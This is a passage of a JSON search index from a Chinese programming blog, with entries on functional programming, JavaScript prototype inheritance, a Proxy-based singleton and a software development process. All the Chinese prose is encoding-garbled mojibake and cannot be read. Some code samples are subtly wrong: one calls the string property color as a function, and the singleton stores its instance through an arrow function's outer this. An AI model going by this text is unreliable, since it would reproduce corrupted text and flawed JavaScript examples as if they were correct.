ä¸ä¾èµ–äºç¨‹åºçš„çŠ¶æ€ï¼ˆæ¯”å¦‚å¯èƒ½å‘ç”Ÿå˜åŒ–çš„å…¨å±€å˜é‡ï¼‰ï¼›\n2ï¼‰çº¯å‡½æ•° â€”â€” åŒä¸€ä¸ªè¾“å…¥æ°¸è¿œèƒ½å¾—åˆ°åŒä¸€ä¸ªè¾“å‡ºï¼›\n3ï¼‰æœ‰é™çš„å‰¯ä½œç”¨ â€”â€” å¯ä»¥ä¸¥æ ¼åœ°é™åˆ¶å‡½æ•°å¤–éƒ¨å¯¹çŠ¶æ€çš„æ›´æ”¹\n","description":"å‡½æ•°å¼ç¼–ç¨‹æ˜¯ä¸€ç§æ–¹æ¡ˆç®€å•ã€åŠŸèƒ½ç‹¬ç«‹ã€å¯¹ä½œç”¨åŸŸå¤–æ²¡æœ‰ä»»ä½•å‰¯ä½œç”¨çš„ç¼–ç¨‹èŒƒå¼ï¼šINPUT -\u003e PROCESS -\u003e OUTPUT","id":29,"section":"javascript","tags":null,"title":"å‡½æ•°å¼ç¼–ç¨‹ç†å¿µ","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/fn-programming/"},{"content":"ä¸€ã€å…³é”®å­—  å¯¹è±¡ objectï¼šæ˜¯æ•°æ®çš„é›†åˆ åŸå‹ç»§æ‰¿ æ„é€ å™¨ åŸå‹é“¾ å­ç±»ç»§æ‰¿  JavaScript ä¸­çš„ï¼ˆå‡ ä¹ï¼‰ä¸€åˆ‡éƒ½æ˜¯å¯¹è±¡ï¼Œé™¤äº†åŸå§‹å€¼ä»¥å¤–ï¼ˆnumber,string,boolean,undefined,null)\näºŒã€ç»å…¸ç»§æ‰¿ vs åŸå‹ç»§æ‰¿ ç¼–ç¨‹ä¸­çš„ç»§æ‰¿æ„å‘³ç€ä¸€ä¸ªå¯¹è±¡åŸºäºå¦ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®å…¶ä»–å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚\nJavaScript ä½¿ç”¨åŸå‹ç»§æ‰¿ï¼Œå®ƒä¸åƒ C æˆ–è€… Java é‚£æ ·çš„ç»å…¸ç»§æ‰¿ï¼Œè¿™æ˜¯ä¸€ä¸ªé‡è¦çš„åŒºåˆ«ã€‚\n   ç»å…¸ç»§æ‰¿ åŸå‹ç»§æ‰¿     class prototype   å¯¹è±¡å®ä¾‹ä» class ç»§æ‰¿ å¯¹è±¡å®ä¾‹ä»å…¶ä»–å¯¹è±¡ç»§æ‰¿   å­ class å¯ä»¥ä»çˆ¶ class ç»§æ‰¿ ä¸ä» class ç»§æ‰¿ï¼ˆå› ä¸º JS æ²¡æœ‰ class çš„æ¦‚å¿µï¼Œå³ä½¿æ˜¯ ES6 çš„ classï¼Œå®ƒçš„åº•å±‚ä¹Ÿæ˜¯åŸºäº prototypeï¼Œæ‰€ä»¥å®ƒåªæ˜¯ä¸€ä¸ªç±»ä¼¼ç»å…¸ class çš„è¯­æ³•ç³–ï¼‰   class æ˜¯ä¸å¯å˜çš„ï¼Œå®ƒä¸èƒ½åœ¨è¿è¡Œæ—¶æ›´æ”¹ åŸå‹prototypeå¯ä»¥åœ¨è¿è¡Œæ—¶æ›´æ”¹   ç±»æ”¯æŒæˆ–ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼ˆå–å†³äºè¯­è¨€ï¼‰ å¯¹è±¡å¯ä»¥ä»å¤šä¸ªåŸå‹ç»§æ‰¿    åŸå‹ç»§æ‰¿   åŸå‹ç»§æ‰¿çš„å®šä¹‰ç‰¹å¾æ˜¯å¯¹è±¡å®ä¾‹å¯ä»¥é€šè¿‡åŸå‹é“¾è®¿é—®ç»§æ‰¿çš„å±æ€§å’Œæ–¹æ³•ã€‚\n  è¿™æ˜¯é€šè¿‡ JavaScript ä¸­çš„æ¯ä¸ªå¯¹è±¡è‡ªåŠ¨èµ‹äºˆä¸€ä¸ªåŸå‹å±æ€§prototypeæ¥å®ç°çš„ã€‚\n  å½“åˆ›å»ºç»§æ‰¿è‡ªçˆ¶å¯¹è±¡çš„å­å¯¹è±¡æ—¶ï¼Œå­å¯¹è±¡å¯ä»¥è®¿é—®çˆ¶å¯¹è±¡çš„åŸå‹å±æ€§prototypeã€‚\n  proptotype å±æ€§æœ¬èº«æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å› ä¸ºå­å¯¹è±¡å¯ä»¥è®¿é—®å…¶çˆ¶å¯¹è±¡çš„åŸå‹å±æ€§ï¼Œå› æ­¤å­å¯¹è±¡å¯ä»¥è®¿é—®å­˜å‚¨åœ¨æ­¤å¤„(prototype)çš„ä»»ä½•å±æ€§å’Œæ–¹æ³•ã€‚\n  æ¡ˆä¾‹ï¼Œå‡è®¾æœ‰ä¸€ä¸ª vehicleï¼ˆè½¦è¾†ï¼‰ å¯¹è±¡ï¼Œåœ¨è®¸å¤šå…¶ä»–è¯­è¨€ä¸­ï¼ŒVehicleä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªclassï¼Œå› ä¸ºå®ƒæ˜¯åˆ›å»ºvehicleï¼ˆè½¦è¾†ï¼‰ç±»å‹å®ä¾‹çš„è“å›¾ã€‚\nç„¶è€Œ JavaScript å¹¶æ²¡æœ‰ class çš„æ¦‚å¿µï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆå¯¹è±¡ï¼‰ï¼Œç”¨ä½œåˆ›å»ºå…¶ä»–å¯¹è±¡çš„è“å›¾ã€‚\n- - - step1. æ„å»ºä¸€ä¸ªâ€œç±»â€ 1 2 3 4 5 6 7 8 9 10  // ä½¿ç”¨æ„é€ å™¨ï¼ˆæ„é€ å‡½æ•°ï¼‰æ„å»ºä¸€ä¸ª`Vehicleï¼ˆè½¦è¾†ï¼‰`ç±» let Vehicle = function (color, weight, year) { this.color = color; this.weight = weight; this.year = year; this.honk = function () { console.log(\u0026#34;Honk!\u0026#34;); //é¸£å–‡å­  }; };   - - - step2. å®åˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ 1 2 3 4  let myVehicle = new Vehicle(\u0026#39;blue\u0026#39;, \u0026#39;500\u0026#39;, 2019);\tmyVehicle.color(); // \u0026#39;blue\u0026#39; myVehicle.honk(); // \u0026#39;Honk!\u0026#39;   - - - step3. åŸå‹ prototype ç™»åœº - ä¼˜åŒ– åœ¨ä¸Šä¾‹ä¸­ï¼Œå› ä¸ºå·²ç»åœ¨æ„é€ å‡½æ•°ä½“ä¸­å®šä¹‰äº† honk æ–¹æ³•ï¼Œ\næ‰€ä»¥æ¯ä¸ªæ–°çš„è½¦è¾†å®ä¾‹éƒ½ä¼šæœ‰å®ƒè‡ªå·±å•ç‹¬çš„ honk å‰¯æœ¬å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚\nç”±äº honk å§‹ç»ˆæ˜¯ç›¸åŒçš„åŠŸèƒ½ï¼Œå› æ­¤æ¯ä¸ªå®ä¾‹å­˜å‚¨è‡ªå·±çš„å”¯ä¸€å‰¯æœ¬æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚\nè¿™å°±æ˜¯åŸå‹çš„åŠ›é‡å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚ï¼ˆå¯¹è±¡å¯ä»¥è®¿é—®å…¶çˆ¶å¯¹è±¡çš„åŸå‹å±æ€§ï¼Œå› æ­¤å°† honk æ–¹æ³•å­˜å‚¨åœ¨ Vehicle çš„åŸå‹å±æ€§ä¸­ï¼Œåˆ™æ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥è®¿é—®å®ƒï¼Œè€Œæ— éœ€å­˜å‚¨è‡ªå·±çš„å‰¯æœ¬ã€‚ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let Vehicle = function (color, weight, year) { this.color = color; this.weight = weight; this.year = year; }; Vehicle.prototype.honk = function () { console.log(\u0026#34;Honk!\u0026#34;); }; let myVehicle = new Vehicle(\u0026#34;blue\u0026#34;, \u0026#34;500\u0026#34;, 2019); myVehicle.honk(); // \u0026#39;Honk!\u0026#39;   ä¸‰ã€åŸå‹é“¾ __proto__ ï¼ˆé“¾æ¥ï¼‰ æœ¬è´¨ä¸Šï¼Œå½“è°ƒç”¨ honk æ–¹æ³•æ—¶ï¼ŒJavaScript å°†æŸ¥çœ‹è°ƒç”¨å¯¹è±¡çš„å±æ€§ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º myVehicleï¼Œç”¨äºåä¸º honk çš„æ–¹æ³•ï¼ˆæˆ–å±æ€§ï¼‰ã€‚ å¦‚æœåœ¨å¯¹è±¡ä¸Šæ‰¾ä¸åˆ°æ­¤å±æ€§ï¼Œæˆ‘ä»¬å°†å‘ä¸Šç§»åŠ¨ä¸€çº§åŸå‹é“¾ã€‚\nä¸ºäº†å»ºç«‹å¯¹è±¡ä¸å…¶åŸå‹ä¹‹é—´çš„é“¾æ¥ï¼Œä½¿ç”¨äº† myVehicle çš„ proto å±æ€§ã€‚ è¿™ä¸ª proto å±æ€§æœ¬è´¨ä¸Šæ˜¯æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°åŸå‹çš„é“¾æ¥ã€‚\nä¸€èˆ¬è€Œè¨€ï¼Œå®ä¾‹çš„ __proto__ å±æ€§æ˜¯æŒ‡å‘å®ƒçš„åŸå‹ï¼ˆå…¶æ„é€ å‡½æ•°çš„åŸå‹å±æ€§ï¼‰çš„é“¾æ¥ã€‚\nåœ¨æ§åˆ¶å°ä¸­æ¼”ç¤ºï¼š\n1 2  myVehicle.__proto__ === Vehicle.prototype // true   å› ä¸ºåœ¨åŸå‹ä¸Šæ˜¾å¼åœ°å­˜å‚¨äº† honk æ–¹æ³•ï¼Œæ‰€ä»¥ï¼ŒVehicle çš„æ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥è®¿é—® honk æ–¹æ³•ï¼Œè€Œæ— éœ€å­˜å‚¨è‡ªå·±çš„å‰¯æœ¬ã€‚\nå››ã€å­ç±»ç»§æ‰¿ï¼ˆç”¨åŸå‹é“¾æ¨¡æ‹Ÿï¼‰   fn.call()ï¼šcallæ–¹æ³•çš„ä½œç”¨æ˜¯è°ƒç”¨fnæ„é€ å‡½æ•°\n  Object.create()ï¼šå…è®¸åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼ŒåŒæ—¶æŒ‡å®šè¯¥å¯¹è±¡çš„åŸå‹\n  å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªä¸åŒçš„æ„é€ å‡½æ•°ï¼Œå®ƒç±»ä¼¼äº Vehicleï¼ˆè½¦è¾†ï¼‰ ä½†æ›´å…·ä½“ï¼Œä¾‹å¦‚ Motorcycleï¼ˆæ‘©æ‰˜è½¦ï¼‰ æ„é€ å‡½æ•°ã€‚\nMotorcycleï¼ˆæ‘©æ‰˜è½¦ï¼‰ å…·æœ‰ä¸ Vehicleï¼ˆè½¦è¾†ï¼‰ ç›¸åŒçš„æ‰€æœ‰å±æ€§å’ŒåŠŸèƒ½ï¼Œä½†å®ƒè¿˜å…·æœ‰ engineSizeï¼ˆå¼•æ“å°ºå¯¸ï¼‰ å±æ€§å’ŒåŠ æ²¹æ–¹æ³•ã€‚\nå› ä¸ºæ‘©æ‰˜è½¦ä¸è½¦è¾†å…±äº«ç›¸åŒçš„å±æ€§ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç»§æ‰¿æ¥ç®€åŒ–ä»£ç ã€‚ é€šè¿‡è®© Motorcycle ä» Vehicle ç»§æ‰¿ï¼Œå¯ä»¥é¿å…ä¸¤æ¬¡æŒ‡å®šå…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚\n æ³¨æ„ï¼šç±»å’Œå­ç±»æ˜¯ç»å…¸ç»§æ‰¿çš„ä¸€ä¸ªç‰¹å¾ï¼Œè€Œä¸æ˜¯åŸå‹ç»§æ‰¿ï¼Œè¿™æ„å‘³ç€Motorcycleå®é™…ä¸Šä¸æ˜¯ä¸€ä¸ªå­ç±»ã€‚ åœ¨ JavaScript ä¸­ï¼Œä½¿ç”¨åŸå‹é“¾æ¥æ¨¡æ‹Ÿç±»å’Œå­ç±»ã€‚  1 2 3 4 5 6 7 8 9  let Motorcycle = function (color, weight, year, engineSize) { Vehicle.call(this, color, weight, year); //callæ–¹æ³•çš„ä½œç”¨æ˜¯è°ƒç”¨Vehicleæ„é€ å‡½æ•°  this.engineSize = engineSize; }; Motorcycle.prototype = Object.create(Vehicle.prototype) //Object.createæ–¹æ³•å…è®¸åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼ŒåŒæ—¶æŒ‡å®šè¯¥å¯¹è±¡çš„åŸå‹  let myMotorcycle = new Motorcycle(\u0026#34;green\u0026#34;, 150, 2015, 500);   é€šè¿‡è¿™ä¸€æ­¥ï¼Œå·²ç»è¿æ¥äº†åŸå‹é“¾ã€‚\nMotorcycle.prototype çš„ proto å±æ€§å°†è®¾ç½®ä¸º Vehicle.prototypeï¼Œæ‘©æ‰˜è½¦å®ä¾‹ç°åœ¨å¯ä»¥è®¿é—®æ‘©æ‰˜è½¦åŸå‹ä»¥åŠè½¦è¾†åŸå‹ä¸Šå­˜å‚¨çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚\nä¸ºäº†æ¼”ç¤ºè¿™ä¸€ç‚¹ï¼Œåœ¨ Motorcycles åŸå‹ä¸­æ·»åŠ åŠ æ²¹æ–¹æ³•:\n1 2 3 4 5 6 7  Motorcycle.prototype.refuel = function () { console.log(\u0026#34;Your fuel tank is now full!\u0026#34;); }; myMotorcycle.honk(); // \u0026#39;Honk!\u0026#39; myMotorcycle.refuel(); // \u0026#39;Your fuel tank is now full!\u0026#39;   äº”ã€ç»“è¯­ JavaScript å®ç°é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ–¹å¼ä¸è®¸å¤šå…¶ä»–ä½¿ç”¨åŸºäºclassç±»çš„è¯­è¨€ä¸åŒã€‚\né€šè¿‡æŒæ¡åŸå‹ç»§æ‰¿ã€æ„é€ å‡½æ•°å’ŒåŸå‹é“¾ï¼Œæ‰å¯ä»¥å……åˆ†åˆ©ç”¨è¯­è¨€ç‰¹æ€§å¹¶äº†è§£ JavaScript åœ¨åº•å±‚æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚\n","description":"JavaScript çš„ç»§æ‰¿å’ŒåŸå‹é“¾æ¦‚å¿µ","id":30,"section":"javascript","tags":null,"title":"åŸå‹é“¾å’Œç»§æ‰¿","uri":"https://codthing.github.io/javascript/prototype/prototype-bp/"},{"content":"å•ä¾‹æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„è½¯ä»¶è®¾è®¡æ¨¡å¼ï¼Œå®ƒç¡®ä¿ç»™å®šçš„ç±»åªè¢«å®ä¾‹åŒ–ä¸€æ¬¡ã€‚\næ¯”å¦‚ï¼Œæ•°æ®åº“è¿æ¥ã€‚\nProxy Proxy å¯¹è±¡ç”¨äºåˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„ä»£ç†ï¼Œä»è€Œå®ç°åŸºæœ¬æ“ä½œçš„æ‹¦æˆªå’Œè‡ªå®šä¹‰ï¼ˆå¦‚å±æ€§æŸ¥æ‰¾ã€èµ‹å€¼ã€æšä¸¾ã€å‡½æ•°è°ƒç”¨ç­‰ï¼‰ã€‚\n#. è¯­æ³• 1 2  new Proxy(target, handler)   #. æœ¯è¯­  handler åŒ…å«æ•æ‰å™¨ï¼ˆtrapï¼‰çš„å ä½ç¬¦å¯¹è±¡ï¼ˆå¤„ç†å™¨å¯¹è±¡ï¼‰ã€‚ traps å…è®¸ä¸ºæŸäº›æ“ä½œï¼ˆä¾‹å¦‚å±æ€§æŸ¥æ‰¾ã€èµ‹å€¼ç­‰ï¼‰å®šä¹‰è‡ªå®šä¹‰è¡Œä¸ºçš„æ–¹æ³•ã€‚è¿™ç±»ä¼¼äºæ“ä½œç³»ç»Ÿä¸­æ•è·å™¨çš„æ¦‚å¿µã€‚ target è¢« Proxy ä»£ç†è™šæ‹ŸåŒ–çš„å¯¹è±¡ã€‚å®ƒå¸¸è¢«ä½œä¸ºä»£ç†çš„å­˜å‚¨åç«¯ã€‚æ ¹æ®ç›®æ ‡éªŒè¯å…³äºå¯¹è±¡ä¸å¯æ‰©å±•æ€§æˆ–ä¸å¯é…ç½®å±æ€§çš„ä¸å˜é‡ï¼ˆä¿æŒä¸å˜çš„è¯­ä¹‰ï¼‰ã€‚  #. Proxy æœ‰2ä¸ªå‚æ•°  target è¢«ä»£ç†çš„å¯¹è±¡ã€‚å®ƒå¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬å†…ç½®çš„æ•°ç»„ï¼Œå‡½æ•°ç”šè‡³æ˜¯å¦ä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚ handler è¢«ä»£ç†å¯¹è±¡ä¸Šçš„è‡ªå®šä¹‰è¡Œä¸ºã€‚å®ƒæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„å±æ€§æä¾›äº†éƒ¨åˆ†æ“ä½œæ—¶æ‰€å‘ç”Ÿçš„å¤„ç†å‡½æ•°ã€‚  ä½¿ç”¨ Proxy æ„å»ºå•ä¾‹æ¨¡å¼  å•ä¾‹æ¨¡å¼è§„å®šç»™å®šçš„ç±»åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ã€‚ è¿™æ„å‘³ç€æœ€æœ‰ç”¨çš„æ•è·å™¨ï¼ˆæ³¨æ„ï¼šproxyä¸­æœ‰å¤šç§æ•è·å™¨ï¼‰æ˜¯ handler.construct()ã€‚ handler.construct() æ–¹æ³•ç”¨äºæ‹¦æˆª new æ“ä½œç¬¦. ä¸ºäº†ä½¿newæ“ä½œç¬¦åœ¨ç”Ÿæˆçš„Proxyå¯¹è±¡ä¸Šç”Ÿæ•ˆï¼Œç”¨äºåˆå§‹åŒ–ä»£ç†çš„ç›®æ ‡å¯¹è±¡è‡ªèº«å¿…é¡»å…·æœ‰[[Construct]]å†…éƒ¨æ–¹æ³•ï¼ˆå³ new target å¿…é¡»æ˜¯æœ‰æ•ˆçš„ï¼‰ã€‚  1 2 3 4 5 6 7 8 9 10 11  const singletonify = (className) =\u0026gt; { return new Proxy(className.prototype.constructor, { instance: null, construct: (target, argumentsList) =\u0026gt; { if (!this.instance) this.instance = new target(...argumentsList); return this.instance; } }); }   ä½¿ç”¨ç¤ºä¾‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class MyClass { constructor(msg) { this.msg = msg; } printMsg() { console.log(this.msg); } } MySingletonClass = singletonify(MyClass); const myObj = new MySingletonClass(\u0026#39;first\u0026#39;); myObj.printMsg(); // \u0026#39;first\u0026#39; const myObj2 = new MySingletonClass(\u0026#39;second\u0026#39;); myObj2.printMsg(); // \u0026#39;first\u0026#39;   å¯ä»¥çœ‹åˆ° ç¬¬äºŒæ¬¡ MySingletonClass è¢«å®ä¾‹åŒ–äº†ï¼Œä½†ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿã€‚\nè¿™æ˜¯å› ä¸ºä¸€ä¸ªå®ä¾‹å·²ç»å­˜åœ¨ï¼Œæ‰€ä»¥å®ƒè¢« è¿”å› è€Œä¸æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ã€‚\n","description":"å•ä¾‹æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„è½¯ä»¶è®¾è®¡æ¨¡å¼ï¼Œå®ƒç¡®ä¿ç»™å®šçš„ç±»åªè¢«å®ä¾‹åŒ–ä¸€æ¬¡","id":31,"section":"javascript","tags":null,"title":"åœ¨ JavaScript ä¸­å®ç°å•ä¾‹","uri":"https://codthing.github.io/javascript/function/single/"},{"content":"ä¸€ã€æ”¶é›†éœ€æ±‚ ç¬¬ä¸€æ­¥ä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€æ­¥æ˜¯æ”¶é›†æ‰€æœ‰éœ€æ±‚ã€‚\næˆ‘ä»¬ç”Ÿæ´»åœ¨ä¸€ä¸ªéå¸¸å¤æ‚çš„ä¸–ç•Œä¸­ï¼Œä¸åŒèƒŒæ™¯çš„äººå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¡«è¡¥ç©ºç™½ï¼ˆè‡ªå·±çš„å±€é™æ€§ï¼‰ã€‚\nå› æ­¤ï¼Œåº”è¯¥ä¸å¯èƒ½å¯¹å…¶æ„Ÿå…´è¶£çš„æ‰€æœ‰äººç¾¤ï¼ˆåˆ©ç›Šç›¸å…³è€…ï¼‰è®¨è®ºè¯¥ä»»åŠ¡ã€‚\néœ€è¦å¯¹æœŸæœ›çš„ç»“æœæœ‰æœ€æ¸…æ¥šçš„ç†è§£ï¼Œéœ€è¦æŠŠå®ƒå†™ä¸‹æ¥ï¼šè¿™æœ‰åŠ©äºå‘ç°æ‰€æœ‰çš„éœ€æ±‚å’Œå½±å“ã€‚\nä¸¾ä¾‹ï¼š\n1. äº§å“å›¢é˜Ÿï¼šä»–ä»¬çŸ¥é“åŠŸèƒ½å’Œç›®æ ‡ã€‚å®ƒä»¬å¸®åŠ©æˆ‘ä»¬äº†è§£è¯¥åŠŸèƒ½çš„å¿«ä¹è·¯å¾„å’Œå•†ä¸šä»·å€¼ã€‚\r2. æŠ€æœ¯å›¢é˜Ÿï¼šä»–ä»¬æ˜¯ç³»ç»Ÿä¸“å®¶ï¼Œå¯ä»¥æŒ‡å‡ºé™·é˜±å’Œå¯èƒ½çš„å¹¶å‘ç—‡ã€‚ä»–ä»¬çš„ç»éªŒå¯¹äºåˆ›å»ºä¼°è®¡å’Œå®šä¹‰æœªçŸ¥æ•°ä¹Ÿå¾ˆé‡è¦ã€‚\r3. è®¾è®¡å›¢é˜Ÿï¼šå¦‚æœè¯¥åŠŸèƒ½æ¶‰åŠ UI æˆ– UX çš„æ›´æ”¹ï¼Œè¯·åŠ¡å¿…ä¸å›¢é˜Ÿè®¨è®ºè®¾è®¡ä»¥å‘ç°ä»»ä½•å¯èƒ½çš„é—®é¢˜ã€‚\r4. QAå›¢é˜Ÿï¼šè´¨é‡ä¿è¯å›¢é˜Ÿæ˜¯æœ€æ¥è¿‘æœ€ç»ˆç”¨æˆ·çš„å›¢é˜Ÿã€‚ä»–ä»¬æ¥å—è¿‡äº§å“ä½¿ç”¨åŸ¹è®­ï¼Œæ“…é•¿å°è¯•å„ç§ä¸æ„‰å¿«çš„é“è·¯ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–ä»¬çš„ç»éªŒæ¥åˆ›å»ºä¸€ç»„æµ‹è¯•ç”¨ä¾‹æ¥æ¨åŠ¨å¼€å‘ã€‚\r5. ç§»åŠ¨å·¥ç¨‹å¸ˆå’Œåç«¯å·¥ç¨‹å¸ˆå¯ä»¥åœ¨ä¸åŒçš„å›¢é˜Ÿä¸­å·¥ä½œå¹¶ç»å¸¸åä½œã€‚å¦‚æœä¸€ä¸ªåŠŸèƒ½éœ€è¦ä¸€ä¸ªæ–°çš„ç«¯ç‚¹ï¼Œé‚£ä¹ˆè®©åç«¯å›¢é˜Ÿå‚ä¸æ˜¯å¾ˆé‡è¦çš„ã€‚ä»–ä»¬éœ€è¦è®¡åˆ’å’Œå®‰æ’ä¸€äº›æ—¶é—´ä¸æ‚¨çš„å›¢é˜Ÿåˆä½œï¼Œä»–ä»¬å¯ä»¥å¸®åŠ©è®¾è®¡ä¸€ä¸ªå¯ä»¥å¾ˆå¥½æ‰©å±•çš„æ•°æ®æµã€‚\r6. æ³•å¾‹/åˆè§„å’Œå®‰å…¨å›¢é˜Ÿï¼šå½“ä¸€é¡¹åŠŸèƒ½éœ€è¦æ”¶é›†ä¸€äº›æ–°æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»è®©æ³•å¾‹ã€åˆè§„å’Œå®‰å…¨å›¢é˜Ÿå‚ä¸ï¼Œä»¥ç¡®ä¿è¯¥åŠŸèƒ½å¯ä»¥å¼€å‘ï¼ŒæœåŠ¡æ¡æ¬¾æ˜¯å¦å¿…é¡»æ›´æ–°ä»¥åŠå¦‚ä½•å¤„ç†ã€‚ ç»å¸¸ä¸è¿™äº›å›¢é˜Ÿæ²Ÿé€šï¼Œå¬å¼€ä¼šè®®å¹¶å…¬å¼€è®¨è®ºè¯¥åŠŸèƒ½ã€‚è®°ä¸‹è®¨è®ºçš„å†…å®¹å¹¶ä¸å›¢é˜Ÿåˆ†äº«ã€‚åœ¨è¿›å…¥ä¸‹ä¸€æ­¥ä¹‹å‰è·å¾—ä»–ä»¬çš„æ”¯æŒã€‚\näºŒã€åŸå‹åˆ¶ä½œ åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œä¸€ä¸¤ä¸ªäººä¼šæŠ•å…¥ä¸€äº›æ—¶é—´æ¥æ¢ç´¢è¯¥æŠ€æœ¯ï¼Œå¹¶å°†å›¢é˜Ÿæƒ³è¦å¼€å‘çš„å†…å®¹çš„æ¦‚å¿µè¯æ˜ (POC) æ”¾åœ¨ä¸€èµ·ã€‚\nè¿™é‡Œçš„ç›®æ ‡æ˜¯å¿«é€Ÿå“åº”ï¼šæ²¡æœ‰â€‹â€‹æµ‹è¯•ï¼Œæ²¡æœ‰å¹²å‡€çš„ä»£ç ï¼Œæ²¡æœ‰é”™è¯¯å¤„ç†ã€‚æˆ‘ä»¬åªéœ€è¦æ£€æŸ¥æ˜¯å¦å¯è¡Œä»¥åŠå¯èƒ½å­˜åœ¨å“ªäº›é—®é¢˜ã€‚\nåŸå‹è®¾è®¡åº”è¯¥æœ‰æ—¶é—´é™åˆ¶ï¼šæ—¶é—´åº”è¯¥æŠ•å…¥æœ€å°‘çš„æ—¶é—´æ¥å›ç­”æœ€æœ‰è¯´æœåŠ›çš„é—®é¢˜ã€‚\nä¸€æ—¦å›¢é˜Ÿæœ‰äº†ä¸€äº›å¯è¡Œçš„æ–¹æ³•ï¼Œè¯·ä¸åˆ©ç›Šç›¸å…³è€…æ ¸å¯¹ä»¥éªŒè¯å›¢é˜Ÿæ˜¯å¦æœç€æ­£ç¡®çš„æ–¹å‘å‰è¿›ã€‚\nç„¶åï¼Œæˆ‘ä»¬å¿…é¡»é¿å…ä¸€ä¸ªå¸¸è§çš„é™·é˜±ï¼šå°†åŸå‹æ¨å‘ç”Ÿäº§ã€‚åŸå‹çš„å¼€å‘æ²¡æœ‰è€ƒè™‘åˆ°å¯æ‰©å±•æ€§å’Œå·¥ç¨‹æœ€ä½³å®è·µã€‚å°†å…¶æ¨å¹¿åˆ°ç”Ÿäº§å¯èƒ½ä¼šå¸¦æ¥çŸ­æœŸæ”¶ç›Šï¼Œä½†ä»é•¿è¿œæ¥çœ‹ï¼Œå®ƒä¼šäº§ç”ŸæŠ€æœ¯å€ºåŠ¡å’Œæ›´é«˜çš„æˆæœ¬ã€‚\nä¸‰ã€è®¾è®¡ ä¸€æ—¦éœ€æ±‚æ˜ç¡®å¹¶ä¸”åŸå‹è¢«æ¥å—ï¼Œå°±æ˜¯ä½¿ç”¨UMLå›¾è¡¨å’Œé€‚å½“çš„æ–‡æ¡£è®¾è®¡é€‚å½“çš„è§£å†³æ–¹æ¡ˆçš„æ—¶å€™äº†ã€‚\nå®ƒå…è®¸æˆ‘ä»¬å¿«é€Ÿç»˜åˆ¶ç±»å›¾å’Œåºåˆ—å›¾ï¼Œä»¥äº†è§£å¦‚ä½•ç»„æˆç³»ç»Ÿä»¥åŠå®ƒåº”è¯¥å¦‚ä½•è¿è¡Œã€‚å¯ä»¥ä½¿ç”¨ç»˜åˆ¶ UML å›¾çš„å·¥å…· - diagrams.netï¼ˆä»¥å‰ç§°ä¸º draw.ioï¼‰\nè®¾è®¡è§£å†³æ–¹æ¡ˆæ—¶æ— éœ€æ·±å…¥ç»†èŠ‚ã€‚é«˜çº§è®¾è®¡ï¼Œç»„ä»¶ä¹‹é—´çš„è¿æ¥å°±è¶³å¤Ÿäº†ã€‚å½“æ‰€æœ‰å›¢é˜Ÿåœ¨è®¾è®¡ä¸Šè¿›è¡Œåä½œå¹¶å°±å®æ–½è¾¾æˆä¸€è‡´æ—¶ï¼Œæ‰èƒ½è·å¾—æœ€ä½³ç»“æœã€‚\né‡‡ç”¨è¿­ä»£æ–¹æ³•å¾ˆé‡è¦ã€‚åœ¨è®¾è®¡è§£å†³æ–¹æ¡ˆçš„ç‰¹å®šéƒ¨åˆ†æ—¶ï¼Œåˆ©ç›Šç›¸å…³è€…åº”è¯¥å‚ä¸è¿›æ¥ï¼šä»–ä»¬å¯ä»¥ä»”ç»†æ£€æŸ¥ä»–ä»¬çš„è¦æ±‚æ˜¯å¦å¾—åˆ°å°Šé‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®‰å…¨å›¢é˜Ÿä¸ç›¸ä¿¡æ•æ„Ÿä¿¡æ¯çš„å­˜å‚¨æ–¹å¼ï¼Œå›¢é˜Ÿå¯ä»¥è¿­ä»£è§£å†³æ–¹æ¡ˆçš„é‚£éƒ¨åˆ†ï¼Œç›´åˆ°æ¯ä¸ªäººéƒ½æ»¡æ„ã€‚\næ­¤æ­¥éª¤çš„ç»“æœæ˜¯ä¸€ä»½åŒ…å«è§£å†³æ–¹æ¡ˆæ¶æ„çš„æ–‡æ¡£ï¼Œæœ‰åŠ©äºå®šä¹‰è¯„ä¼°ã€‚å®ƒè¿˜è·Ÿè¸ªæ—¶é—´çº¿ä¸Šåšå‡ºçš„å†³å®šã€‚\nå››ã€æµ‹è¯•é©